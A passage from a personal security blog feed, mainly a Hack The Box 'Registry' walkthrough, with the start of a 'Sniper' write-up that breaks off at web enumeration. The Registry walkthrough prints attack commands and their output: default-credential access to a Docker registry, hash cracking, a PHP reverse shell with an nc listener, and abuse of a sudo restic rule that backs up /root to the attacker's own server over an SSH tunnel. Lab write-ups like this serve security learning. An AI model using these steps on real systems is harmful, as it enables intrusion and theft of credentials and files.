&lt;p&gt;I will be writting all the writeups of the challenges that I solved besides last two catageory which was the easy challenge. I would especially like tothank host of the VirSecCon CTF &lt;a href=&quot;https://twitter.com/_johnhammond&quot;&gt;John Hammond&lt;/a&gt; for providing a such an awesome platform.&lt;/p&gt;

&lt;p&gt;Stay Updated with my blog.&lt;/p&gt;

&lt;p&gt;Feedback are really appricated.&lt;/p&gt;

&lt;p&gt;#COVID-19&lt;/p&gt;

&lt;p&gt;#Stay_Safe&lt;/p&gt;

&lt;p&gt;#quarantine&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="VirSecCon" /><category term="VSCCTF" /><category term="ctf" /><summary type="html">Introduction</summary></entry><entry><title type="html">Hack The Box: Registry</title><link href="http://localhost:4000/2020/04/04/htb-registry.html" rel="alternate" type="text/html" title="Hack The Box: Registry" /><published>2020-04-04T00:00:00+05:45</published><updated>2020-04-04T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/04/htb-registry</id><content type="html" xml:base="http://localhost:4000/2020/04/04/htb-registry.html">&lt;h2 id=&quot;htbregistry&quot;&gt;HTB:Registry&lt;/h2&gt;

&lt;p&gt;Registry box was the hard box. It falls under linux and hard category. Especially to read the root flag was a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting the docker registry page where I got the &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; key and &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;. For root, I got the &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; shell by exploiting &lt;code class=&quot;highlighter-rouge&quot;&gt;CSRF TO RCE&lt;/code&gt; then with that shell I downloaded the backups files with restic-service and got a &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;. I’ll show all my payload(including that didn’t work in initial deployment to get the root).&lt;/p&gt;

&lt;h2 id=&quot;box-details&quot;&gt;Box Details&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/registry_detail.png&quot; alt=&quot;registry_box&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the above picture it’s IP was &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.159&lt;/code&gt; and added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as registry.htb. Let’s solve this box.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let’s start with our universal port scanner, &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to see the open port and which shows port &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH(22)&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTP(TCP 80)&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;SSL(TCP 443)&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ nmap -sS -sV -sC -Pn -oA nmap.txt 10.10.10.159
# Nmap 7.80 scan initiated Thu Oct 24 22:03:45 2019 as: nmap -sS -sV -sC -Pn -oA nmap.txt 10.10.10.159
Nmap scan report for 10.10.10.159
Host is up (0.30s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 24 22:04:44 2019 -- 1 IP address (1 host up) scanned in 58.92 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;registry.htb&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;As soon as I saw port 80 opened I visited the site and got below as output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/registry_web.jpg&quot; alt=&quot;registry_web&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now as usual for website I we usually searched for dir so I searched  &lt;code class=&quot;highlighter-rouge&quot;&gt;dirsearch&lt;/code&gt; tool as .&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ./dirsearch.py -e html,txt,php,pcap,tar,bzip -u http://registry.htb/ -w ~/Downloads/wo
rdlists/SecLists/Discovery/Web-Content/raft-large-directories.txt 

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: html, txt, php, pcap, tar, bzip | Threads: 10 | Wordlist size: 62279

Error Log: /home/bikram/bbek/recon_tool/dirsearch/logs/errors-20-04-02_20-42-51.log

Target: http://registry.htb/

[20:42:51] Starting: 
[20:42:54] 301 -  194B  - /install  -&amp;gt;  http://registry.htb/install/
[20:46:22] 200 -  612B  - /bolt 

Task Completed

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and got the dir &lt;code class=&quot;highlighter-rouge&quot;&gt;/bolt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/install&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/registy_bolt.jpg&quot; alt=&quot;bolt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fig: &lt;code class=&quot;highlighter-rouge&quot;&gt;/bolt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/registry_install.jpg&quot; alt=&quot;install&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fig: &lt;code class=&quot;highlighter-rouge&quot;&gt;/install&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;subdomain-enumeration&quot;&gt;Subdomain Enumeration&lt;/h3&gt;
&lt;p&gt;As the given was &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; but looked over &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; too. In order to find the interesting things I usually use &lt;code class=&quot;highlighter-rouge&quot;&gt;nikto&lt;/code&gt; tool. So I used it here too and got the subdomain as &lt;code class=&quot;highlighter-rouge&quot;&gt;docker.registry.htb&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ nikto -h https://10.10.10.159                                                                             
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.159
+ Target Hostname:    10.10.10.159
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=docker.registry.htb
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /CN=Registry
+ Start Time:         2020-04-02 21:44:11 (GMT5.75)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and Expect-CT header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Hostname '10.10.10.159' does not match certificate's names: docker.registry.htb
+ The Content-Encoding header is set to &quot;deflate&quot; this may mean that the server is vulnerable to the BREACH attack.
+ OSVDB-3092: /install/: This might be interesting...
+ 7876 requests: 8 error(s) and 5 item(s) reported on remote host
+ End Time:           2020-04-03 00:49:25 (GMT5.75) (11114 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;docker-registry-exploit&quot;&gt;Docker Registry Exploit&lt;/h3&gt;

&lt;p&gt;Then I found the dir with dirsearch as &lt;code class=&quot;highlighter-rouge&quot;&gt;http://docker.registry.htb/v2/&lt;/code&gt; and able to login with creds &lt;code class=&quot;highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;. So I googled about it and found the interesting blog which explain how can we exploit the docker registry to download the stored files. You can find it &lt;a href=&quot;https://www.notsosecure.com/anatomy-of-a-hack-docker-registry&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Then I used this blog to exploit the docker registry and downloaded the file as&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ curl --user &quot;admin:admin&quot; http://docker.registry.htb/v2/bolt-image/manifests/latest                [80/311]
{                                                                                                                                                     
   &quot;schemaVersion&quot;: 1,                                                                                                                                
   &quot;name&quot;: &quot;bolt-image&quot;,                                                                                                                              
   &quot;tag&quot;: &quot;latest&quot;,                                                                                                                                   
   &quot;architecture&quot;: &quot;amd64&quot;,                                                                                                                           
   &quot;fsLayers&quot;: [                                                                                                                                      
      {                                                                                                                                               
         &quot;blobSum&quot;: &quot;sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&quot;                                                         
      },                                                                                                                                              
      {                                                                                                                                               
         &quot;blobSum&quot;: &quot;sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee&quot;                                                         
      },                                                                                                                                              
      {                                                                                                                                               
         &quot;blobSum&quot;: &quot;sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c&quot;                                                         
      },                                                                                                                                              
      {                                                                                                                                               
         &quot;blobSum&quot;: &quot;sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7&quot;                                                         
      },                                                                                                                                              
      {                                                                                                                                               
         &quot;blobSum&quot;: &quot;sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791&quot;                                                         
      },                                                                                                                                              
      {
         &quot;blobSum&quot;: &quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&quot;
      },
      {
         &quot;blobSum&quot;: &quot;sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0&quot;
      },
      {
         &quot;blobSum&quot;: &quot;sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a&quot;
      },
      {
         &quot;blobSum&quot;: &quot;sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797&quot;
      },
      {
         &quot;blobSum&quot;: &quot;sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff&quot;
      }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From above I saw the files name which start with &lt;code class=&quot;highlighter-rouge&quot;&gt;sha256&lt;/code&gt; and downloaded to my local machine as zip file and unzipped it. After all I found interesting folder name with file &lt;code class=&quot;highlighter-rouge&quot;&gt;01-ssh.ssh&lt;/code&gt;  &lt;code class=&quot;highlighter-rouge&quot;&gt;sha256_302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&lt;/code&gt; and got this as output.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect &quot;Enter passphrase for /root/.ssh/id_rsa:&quot;
send &quot;GkOcz221Ftb3ugog\n&quot;;
expect &quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&quot;
interact
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;this way I got the &lt;code class=&quot;highlighter-rouge&quot;&gt;passphraase&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; and able to ssh in as bolt.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ssh -i id_rsa bolt@registry.htb
The authenticity of host 'registry.htb (10.10.10.159)' can't be established.
ECDSA key fingerprint is SHA256:G1J5ek/T6KuCCT7Xp2IN1LUslRt24mhmhKUo/kWWVrs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'registry.htb' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Fri Apr  3 07:54:40 UTC 2020

  System load:  0.0               Users logged in:                1
  Usage of /:   6.1% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 49%               IP address for docker0:         172.17.0.1
  Swap usage:   0%                IP address for br-1bad9bd75d17: 172.18.0.1
  Processes:    157
Last login: Fri Apr  3 06:36:39 2020 from 10.10.14.18
bolt@bolt:~$ whoami
bolt
bolt@bolt:~$ cat user.txt
ytc0yt***************
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This way I got the user &lt;code class=&quot;highlighter-rouge&quot;&gt;bolt&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;to-root&quot;&gt;To Root&lt;/h2&gt;

&lt;h3 id=&quot;web-enumeration-1&quot;&gt;Web Enumeration&lt;/h3&gt;

&lt;p&gt;After a lot of dir search with different wordlist I finally got the login page of &lt;code class=&quot;highlighter-rouge&quot;&gt;bolt&lt;/code&gt; cms site as.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/bolt_login.jpg&quot; alt=&quot;bolt_login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fig: Login Page&lt;/p&gt;

&lt;p&gt;then I searched everypart of the bolt shell and got the hash in dir &lt;em&gt;/var/www/html/app/database/bolt.db&lt;/em&gt; and on &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; I got the hash &lt;em&gt;$2y$10$e.ChUytg9SrL7AsboF2bX .wWKQ1LkS5Fi/Z0yYD86.P5E9cpY7P&lt;/em&gt;. Now I used &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; to crack the hash and got the password &lt;code class=&quot;highlighter-rouge&quot;&gt;strawberry&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ john hash -wordlist=/usr/share/wordlists/rockyou.txt
[sudo] password for bikram: 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
strawberry       (?)
1g 0:00:00:05 DONE (2020-04-03 14:02) 0.1992g/s 71.71p/s 71.71c/s 71.71C/s strawberry..brianna
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I used that creds(&lt;code class=&quot;highlighter-rouge&quot;&gt;admin:strawerry&lt;/code&gt;) and logged in bolt cms.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/bolt_logged.jpg&quot; alt=&quot;bolt_logged&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fig: Admin User&lt;/p&gt;

&lt;h3 id=&quot;unprivileged-user&quot;&gt;Unprivileged User&lt;/h3&gt;
&lt;p&gt;After logged in, I searched every part of cms and found the file upload field where I was unable to upload the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file. Since I was &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; edited and added &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; extension in file &lt;code class=&quot;highlighter-rouge&quot;&gt;config.yml&lt;/code&gt; which was located at url &lt;code class=&quot;highlighter-rouge&quot;&gt;http://registry.htb/bolt/bolt/file/edit/config/config.yml&lt;/code&gt;  with a &lt;code class=&quot;highlighter-rouge&quot;&gt;php-reverse-shell.php&lt;/code&gt; and listener on.
I found one interesting blog &lt;a href=&quot;https://fgsec.net/from-csrf-to-rce-bolt-cms/&quot;&gt;CSRF-TO-RCE&lt;/a&gt; you can read it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/rest_server.jpg&quot; alt=&quot;rest_server&quot; /&gt;
Fig: Uploaded File&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Listner on&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ nc -lvnp 8888
listneing on [any] 8888

connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58100
Linux bolt 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC x86_64 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0 can't access tty;job contorl turned off
$ $python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
www-data@bolt:$ sudo -l 
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As, I saw the &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt; server running as root then searched for files and got &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.php&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bolt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;backup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;restic-server&quot;&gt;Restic Server&lt;/h4&gt;
&lt;p&gt;Then I searched about &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt; server and collected knowledge you can find &lt;a href=&quot;https://restic.readthedocs.io/en/latest/&quot;&gt;here&lt;/a&gt; and at first I download to my localhost then started the restic server as you can find file &lt;a href=&quot;https://github.com/restic/rest-server&quot;&gt;rest-server&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ rest-server --path . --no-auth
Data directory: .
Authentication disabled
Private repositories disabled
Starting server on:8000
Creating repository directories in .
Creating repository directories in .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now before directly using the &lt;code class=&quot;highlighter-rouge&quot;&gt;rest-server&lt;/code&gt; in machine I used and in my local machine and it worked.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ restic -r http://10.10.14.129:8000 init
enter password for new repository:
enter password again:
created restic repository 39fcbee204 at rest:http://10.10.14.129:8000

Please note that knowledge of your password is required to access the repository. Losing your password means that your data is irreversibly lost.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;port-forwarding&quot;&gt;Port Forwarding&lt;/h4&gt;
&lt;p&gt;After, it worked in my local machine I port forward from 8000 to 1234 ( this willn’t work if your python is active at 8000 then it will route to another port ).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ssh bolt@10.10.10.159 -i id_rsa -R 1234:127.0.0.1:8000
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic	 x86_64)

	System information as of Mon Nov 11 14:1018 UTC 2019
	
	System Load: 0.02 			Users logged in:					1
	Usage of /: 6.5% of 61.80GB	IP address for eth0:				10.10.10.159
	Memory usage: 53%			IP address for br-1bad9bd75d17: 	172.18.0.1
	Swap usage: 1%				IP address of docker0: 			172.17.0.1
	Processes: 206
	
	=&amp;gt; There is 1 zombies process.
Last Login: Mon Nov 11 14:1018 2019 from 10.10.15.129
bolt@bolt:~$whoami
bolt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;At first I used the full directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt; server but that doesn’t work so I used below command in &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; shell&lt;/p&gt;

&lt;h3 id=&quot;rest-server-backup-files&quot;&gt;Rest-Server Backup Files&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bolt:~$ sudo restic backup -r rest:http://127.0.0.1:1234 /root/ 
sudo restic backup -r rest:http://127.0.0.1:1234 /root/
enter password for repository: something

password is correct 
found 1 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to scan [/root]
scanned 18 directories, 19 files in 0:00
[0:03] 100.00% 39.690 KiB / 39.690 KiB 37 /37 items 0 errors ETA 0:00 duration: 0:03
snapshot 4bf1b3af saved
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally I restored and checked the &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt; server directory and got the files as&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ restic restore 4bf1b3af915544c9d15d4aa741731382c9fd2dc68ffec7f769a237aaf52c2c02
enter password for repository:
repository 39fcbee2 opened succesfully, password is correct
created new cache in /root/.cache/restic
restorying &amp;lt;Snapshot 4bf1b3af of [/root] at 2019-11-11 14:13:38.38.895820081 +0000 UTC &amp;gt; root@bolt to .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then I checked back to the folder &lt;code class=&quot;highlighter-rouge&quot;&gt;snapshot&lt;/code&gt; and got the &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~/snapshots$ ls
4bf1b3af915544c9d15d4aa741731382c9fd2dc68ffec7f769a237aaf52c2c02  root
root@gr4n173:~/snapshots$ cd root
root@gr4n173:~/snapshots/root$ ls
config.yml  cron.sh  root.txt
root@gr4n173:~/snapshots/root$ cat root.txt
ntrkz*********************
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This way I got the root of Registry box and learned alot from this box. So I would like to thank creator of this box &lt;code class=&quot;highlighter-rouge&quot;&gt;thek&lt;/code&gt; for such an awesome box. Especially downloading the backup files from restic server was new one.&lt;/p&gt;

&lt;p&gt;I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.&lt;/p&gt;

&lt;p&gt;Feedback are really appreciated !!&lt;/p&gt;

&lt;p&gt;Tweet about this writeup if you like.&lt;/p&gt;

&lt;p&gt;You can see more blog at my medium here: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="linxu" /><category term="htb" /><category term="boltcms" /><category term="csrftorce" /><category term="restic-server" /><category term="port-forward" /><summary type="html">HTB:Registry</summary></entry><entry><title type="html">Hack The Box : Sniper</title><link href="http://localhost:4000/2020/03/28/htb-sniper.html" rel="alternate" type="text/html" title="Hack The Box : Sniper" /><published>2020-03-28T00:00:00+05:45</published><updated>2020-03-28T00:00:00+05:45</updated><id>http://localhost:4000/2020/03/28/htb-sniper</id><content type="html" xml:base="http://localhost:4000/2020/03/28/htb-sniper.html">&lt;h2 id=&quot;htbsniper&quot;&gt;HTB:Sniper&lt;/h2&gt;

&lt;p&gt;Sniper box was easy box. It falls under windows and medium category. Here, everything was all about enumeration and webshell upload. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting RFI using SMB and I got the unprivelege user shell to privelege by using powershell commands and with .chm exploit I got root.txt. I’ll show all my payload (including that didn’t work in initial deployment to get root).&lt;/p&gt;

&lt;h2 id=&quot;box-details&quot;&gt;Box Details&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/sniperdetail.png&quot; alt=&quot;box_detail&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the above it’s ip was &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.14.151&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as sniper.htb. Let’s solve this box.&lt;/p&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;

&lt;p&gt;Let’s start with universal port scanner, &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to see the open ports and &lt;code class=&quot;highlighter-rouge&quot;&gt;port 80&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; service was opened.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Mar 27 21:34:08 2020 as: nmap -sS -sC -sV -Pn -oA nmap.txt 10.10.10.151
Nmap scan report for sniper.htb (10.10.10.151)
Host is up (0.41s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h03m03s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-27T22:53:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 27 21:35:52 2020 -- 1 IP address (1 host up) scanned in 103.56 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;
